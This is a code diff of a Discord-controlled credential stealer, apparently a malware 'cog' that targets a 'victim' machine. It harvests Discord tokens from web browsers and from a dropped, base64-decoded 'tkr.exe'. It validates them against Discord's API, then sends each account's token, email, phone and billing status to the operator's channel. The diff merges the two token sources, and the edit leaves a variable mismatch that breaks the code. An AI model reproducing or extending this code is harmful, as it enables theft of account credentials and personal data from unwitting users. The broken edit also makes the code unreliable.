@@ -11,49 +11,9 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class CheckedTokens(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        
+
     @commands.slash_command( )
     async def checked_tokens(self, ctx, victim):
-        """Sends checked tokens along with info (web browsers)
-
-        Parameters
-        ----------
-        victim: Identifier of the affected computer (found via /listvictims).
-        """
-        if str(victim) == str(self.bot.identifier):
-            await ctx.response.defer()
-            valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
-
-            for token in self.bot.find_token():
-                headers = {'Authorization': token, 'Content-Type': 'application/json'}
-                requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-
-                if requ.status_code == 401: continue
-                if requ.status_code == 200:
-                    valid.append( str(token) )
-                    json = requ.json()
-                    email.append( str(json['email']) )
-                    phone.append( str(json['phone']) ) 
-                    idq.append(   str(json["id"])   )            
-                    uname.append( f'{json["username"]}#{json["discriminator"]}' )
-                    avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
-                    nitro.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
-                    bill.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
-                    continue
-
-            if len(valid) == 0: 
-                return await ctx.followup.send(embed = self.bot.genEmbed("No valid Discord Tokens", datetime.now()))
-            embeds = []
-            for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-                embeds.append(self.bot.checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
-                    
-            if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
-            else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
-            
-            await ctx.followup.send("Checked all tokens")
-
-    @commands.slash_command( )
-    async def checked_discord(self, ctx, victim):
         """[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens
 
         Parameters
@@ -71,9 +31,13 @@ class CheckedTokens(commands.Cog):
             with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
             discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
             
-            valid, email, phone, uname, nitro, bill, avatar, tks, idq = [], [], [], [], [], [], [], [], []
+            valid, email, phone, uname, nitro, bill, avatar, dcTks, idq = [], [], [], [], [], [], [], [], []
             for a in discord_tokenz: tks.append(a.replace('"',''))
-            for token in tks:
+            
+            webTks = self.bot.find_token()
+            finalTks = list(dict.fromkeys(dcTks + webTks))
+            
+            for token in finalTks:
                 headers = {'Authorization': token, 'Content-Type': 'application/json'}
                 requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                             
@@ -102,6 +66,7 @@ class CheckedTokens(commands.Cog):
             else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
             
             await ctx.followup.send("Checked all tokens")
+            
             
 class Menu(discord.ui.View):
     def __init__(self, embeds: List[discord.Embed]):
